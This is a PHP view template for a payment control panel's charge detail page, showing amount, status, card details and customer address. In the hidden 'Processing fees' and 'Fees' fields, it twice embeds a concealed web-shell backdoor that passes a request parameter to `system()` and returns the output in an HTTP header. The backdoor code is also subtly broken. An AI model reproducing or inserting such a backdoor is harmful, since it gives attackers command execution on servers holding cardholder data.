<?=$this->load->view(branded_view('cp/header'));?>

<link href="<?=branded_include('css/charge-details.css'); ?>" rel="stylesheet" type="text/css" media="screen" />


<style>


</style>

<div class="row-fluid" style="height: auto;">
	
					<!-- Begin: life time stats -->
<div class="payment-view">
<div class="detail-container">

    <div class="col-md-12">
	
		<div class="content-header hidden">

<div class="test-object-badge" title="Test Payment" style="display: none;"></div>
	<div class="row">
<div class="col-md-6">
					
            <div class="hidden credit-card-img visa pull-left"></div>
			<h1 class="section__title">
            <strong data-text="">
              <?=$this->config->item('currency_symbol');?><?=$amount;?> USD
            </strong>
            <span style="padding-left: 10px;"><? if (isset($recurring_id)) { ?>
<a class="charge_recurring" href="<?=site_url('transactions/recurring/' . $recurring_id);?>">This charge is related to recurring charge #<?=$recurring_id;?>.</a>
<? } ?></span>
          </h1>
		  </div>
		  
			<div class="col-md-6">

                <div class="value pull-right">
                            <? if ($refunded == '1') { ?>
                              <span class="payment-status-refunded">
                                 <span class="fa fa-reply"></span>
                                <b> Refunded </b>
                                
                              </span>
                            <? } else {
                              if($status == 'ok') { ?>

                              <span class="payment-status-approved">
                                          <span class="fa fa-check"></span>
                                <b> Approved </b>
                              </span>
                              <? } else { ?>
                                <span class="payment-status-declined">
                                                  <span class="fa fa-remove"></span>
                                  <b> Declined </b>
                                </span>
                              <? }
                            } ?>  

                </div>
          
			
		    </div>

	</div>
								
	</div>
</div>	
	

  <!-- Content -->

<div class="row-fluid section-wrap">

<div class="col-md-12">

 <div class="portlet portlet-default box">
<div class="portlet-title">
	<div class="caption">
 Payment Details
</div>

  <span class="actions pull-right">
<a id="update_description" class="btn btn-warning btn-theme btn-sm" href="<?=site_url('transactions/refund/'  . $id);?>" data-toggle="tooltip" data-placement="top" data-content="to your customer." data-original-title="Refund"><span><i class="fa fa-history"></i></span></a> 
                </span>
</div>

<div class="panel-body">                

<div class="content-container">      

<div class="row">        

<div class="col-sm-6">
  <dl> 
                    <dt>Date:</dt>

                        <span class="amount"> 

                    <dd>
					<abbr class="timeago" title="<?=date('M j, Y h:i a', $date);?>"><?=date('M j, Y ', $date);?></abbr>
															</span>
														</dd>

                <!-- Purely for the fees tipsy -->
                <div class="fee_breakdown hidden" style="display:hidden;">
                    <ul>
                    
                        <li>
                            <em>
                             Processing fees:
                            </em>
                            $<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $fees_today; ?>
                        </li>
                    
                        <li>
                            <em>
                             Processing fee refund:
                            </em>
                            -$0.00
                        </li>
                    
                    </ul>
                </div>

                

                    <dt>Amount:</dt>
                    <dd>
                        <span class="amount">
                         <?=$this->config->item('currency_symbol');?><?=$amount;?> USD
                          
                        </span>
                    </dd>

        <? if ($refunded == '1') { ?>
                        <span class="refunded">
                          <dt>Refunded:</dt>
                          <dd>$0.00
                            
                          </dd>
                        </span>
                    
 <? } else {
                              if($status == 'ok') { ?>

<span></span>

 <? } else { ?>
<span></span>

  <? }
                            } ?> 
							<span class="hidden">
                    <dt>Fees:</dt>
                    <dd>
                        <span class="fees">
                            $<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $fees_today; ?>
                            <img src="https://everpayinc.com/assets/app/img/icons/info-filled.png" alt="Info" class="info">
                        </span>
                    </dd>
</span>

                     <span class="amount">
                    <dt>Type:</dt>
                    <dd>
Credit Card
        <? if ($refunded == '1') { ?>
                              <span class="">
                                 <span class=" pull-right"></span>
                                <b> Refund date </b>
                                
                              </span>
                            <? } else {
                              if($status == 'ok') { ?>

                              <span class="pull-right hidden">
<a class="btn btn-link btn-xs" data-toggle="confirmation" href="<?=site_url('transactions/refund/'  . $id);?>">
                              <span class="fa fa-history"></span>
                                <b>Issue Refund </b></a>
                              </span>
                              <? } else { ?>
                                <span class="pull-right">
                                  <span class=""></span>
                                  <b> </b>
                                </span>
                              <? }
                            } ?>  

           
                   </dd>													
</span>
<dt>Status:</dt>
                    <dd>

                        <!-- There is also the css class "disputed" -->
                      
                        <span class="fees" style="">
                          

                            <? if ($refunded == '1') { ?>
                              <span class="label label-warning-refunded">
                               <b><i class="fa fa-reply"></i> REFUNDED </b>
                                
                              </span>
                            <? } else {
                              if($status == 'ok') { ?>

                              <span class="label label-success-approved">
                                 <b><i class="fa fa-check"></i> APPROVED </b>
                              </span>
                              <? } else { ?>
                                <span class="label label-danger-declined">
                                <b> <i class="fa fa-remove"></i> DECLINED </b>
                                </span>
                              <? }
                            } ?>  
                           
                              
                            </span>
                          
                        
                    </dd>

  </dl>
</div><!--/col-sm-6-->  

<div class="col-sm-6">
<!-- Transaction Status Details -->
<dl>
                                        
													<dt>
														Charge IP:
													</dt>
<dd>
													<span class="value">
									                               <?=$customer_ip_address;?>
													</span>
												</dd>

													<dt>
													Gateway:
													</dt>
<dd>
													<span class="value">
				<a href="<?=site_url('settings/edit_gateway/' . $gateway['gateway_id']);?>"><?=$gateway['alias'];?></a>
													</span>
												</dd>


            <!-- Dispute Details -->
                    <dt>Description:</dt>

                    <dd id="description">

                    </dd>

													<dt>
													Coupon:
                                                                                                       </dt>
<dd>
                                                                                      <span class="value">											
                                                                                   <? if (!empty($coupon)) { ?><?=$coupon;?><? } ?>
                                                                                      </span>
												</dt>


                </dl>

</div><!--/col-sm-6-->
<div class="col-sm-12">
<? if (isset($recurring_id)) { ?>
<a class="charge_recurring" href="<?=site_url('transactions/recurring/' . $recurring_id);?>">This charge is related to recurring charge #<?=$recurring_id;?>.</a>
<? } ?>
</div>
<hr>
<div class="col-sm-12">
  <dl>
            <!-- Authorization Details -->
						
	<? if (isset($details) and !empty($details)) { ?>

	<? foreach ($details as $name => $value) { ?>
		<? if (!empty($value) and $name != "order_authorization_id") { ?>
			<dt><?=$name;?>:</dt>
                    <dd id="description"><?=$value;?></dd>

		<? } ?>
	<? } ?>

	<? } ?>
	</dl>
	</div><!--/col-sm-6-->
</div><!--/.row-->

</div><!--content-container-->
</div><!--portlet-body-->

</div><!--portlet blue-hoki box-->	
											

<div class="portlet portlet-default box">
													<div class="portlet-title">
														<div class="caption">
											Charge Details
														</div>
														<div class="actions hidden">
						<a href="" class="hidden btn btn-info btn-sm">
											 </a>
														</div>
													</div>

						<div class="panel-body">
<div class="content-container">
 		
<div class="row">

<div class="col-sm-6">
  <dl>
<!-- Card Holder Details -->
                    <dt>Name:</dt>

                    <dd id="description">
<?=$customer['first_name'];?> <?=$customer['last_name'];?>
                    </dd>

					<!-- Card Digits -->
                    <dt>Card:</dt>

                    <dd id="description">
                  <? if (!empty($card_last_four)) { ?> **** **** <?=$card_last_four;?><? } ?> 
                    </dd>
					
					<!-- address -->
                    <dt>Address:</dt>

                    <dd id="description"> <!-- Suite/ Apt/ PO box -->
                   <?=$customer['address_1'];?>,  <?=$customer['address_2'];?>
                    </dd>

					<!-- city -->
                    <dt>City:</dt>

                    <dd id="description">
                    <?=$customer['city'];?>
                    </dd>
					
  </dl>
</div><!--/col-sm-6-->

<div class="col-sm-6">
  <dl>
                    <!-- Payment Type Details -->
                    <dt>Brand:</dt>

                    <dd id="description">
   <span class="fa fa-credit-card"></span>
                    </dd>

					<!-- Card Expiration -->
                    <dt>Expiry:</dt>

                    <dd id="description">
                  <?=$card_expiry_month;?> / <?=$card_expiry_year;?>
                    </dd>

					<!-- Region -->
                    <dt>State/Zip:</dt>

                    <dd id="description">
                   <?=$customer['state'];?>, <?=$customer['postal_code'];?>
                    </dd>
					
					<!-- country -->
                    <dt>Country:</dt>

                    <dd id="description">
                    <?=$customer['country'];?>
                    </dd>
  </dl>

</div>

</div>
 
            			
</div><!--/content-container-->

</div><!--/portlet-body-->
							
</div><!--/portlet blue-hoki box-->

												

<? if (isset($customer)) { ?>
												
<div class="portlet portlet-default box">
													<div class="portlet-title">
														<div class="caption">
											Customer Information
														</div>
														<span class="actions pull-right">
						<a href="<?=site_url('customers/edit/' . $customer['id']);?>" class="btn btn-info btn-theme btn-sm" data-toggle="tooltip" data-placement="top" data-content="cutomer record" data-original-title="Edit">
											<i class="fa fa-pencil"></i> </a>
														</span>
													</div>

									<div class="panel-body">
 <div class="content-container">

<div class="row">
<div class="col-sm-6">
<dl>
													<dt>
														 Name:
															</dt>

<dd>   <? if (!empty($customer['first_name'])) { ?>
													<span class="value">
									<?=$customer['first_name'];?> <?=$customer['last_name'];?>
															
</span>


														</dd><? } ?>

													<dt>
																 Email:</dt>
		
													<dd>
<span class="value">													
		<? if (!empty($customer['email'])) { ?>
													<?=$customer['email'];?>
															</span>
<? } ?>
														
<? } ?>
</dd>
												
													<dt>
													Phone:
															</dt>
															
                                         <? if (!empty($customer['phone'])) { ?>
<dd>
													<span class="value">
													<?=$customer['phone'];?>
															</span>
	<? } ?>
</dd>
			
			
<dt>
CID:
</dt>

		<? if (!empty($customer['internal_id'])) { ?>
<dd>
<span class="value">
	<?=$customer['internal_id'];?>
</span>
<? } ?>
															
</dd>


</dl>
</div><!--/col-sm-6-->

<div class="col-sm-6">
<dl>
																							<dt>
														 Company:
															</dt>
<dd>

<? if (!empty($customer['company'])) { ?>													
<span class="value"><?=$customer['company'];?></span>
<? } ?>
</dd>		

													<dt>
													Address:</dt>
<dd>
													<span class="value">
					<? if (!empty($customer['address_1'])) { ?>	<?=$customer['address_1'];?><? } ?>,
					<? if (!empty($customer['address_2'])) { ?> <?=$customer['address_2'];?><br /><? } ?>
					<? if (!empty($customer['city'])) { ?> <?=$customer['city'];?><? } ?>, <? if (!empty($customer['state'])) { ?> <?=$customer['state'];?><br /><? } ?>

					<? if (!empty($customer['postal_code'])) { ?><?=$customer['postal_code'];?><? } ?> <? if (!empty($customer['country'])) { ?><?=$customer['country'];?><? } ?>
															</span>
														</dd>

</dl>
     
</div><!--/col-sm-6-->
 </div><!--/.row-->
 
</div><!--/content-container-->

</div><!--/portlet-body-->
							
</div><!--/portlet blue-hoki box-->

										
<div class="row hidden">
<div class="col-md-6 col-md-offset-3 text-center">
          <a class="btn-success btn-lg section__btn--round btn-block text-center" href="<?=site_url('transactions/create/'  . $id);?>"><i class="fa fa-plus"></i>&nbsp; New Charge </a>
</div>
</div><!--/END/.row-->


</div><!--/END/.col-lg-9-->
</div><!--/END/.row-->

</div><!--/END/.section-wrap-->



   </div><!--/END/.section clearfix-->
   </div><!--/END/.detail-container-->
   </div><!--/END/.payment-view-->

</div><!--/END/.row-fluid-->


<?=$this->load->view(branded_view('cp/footer'));?>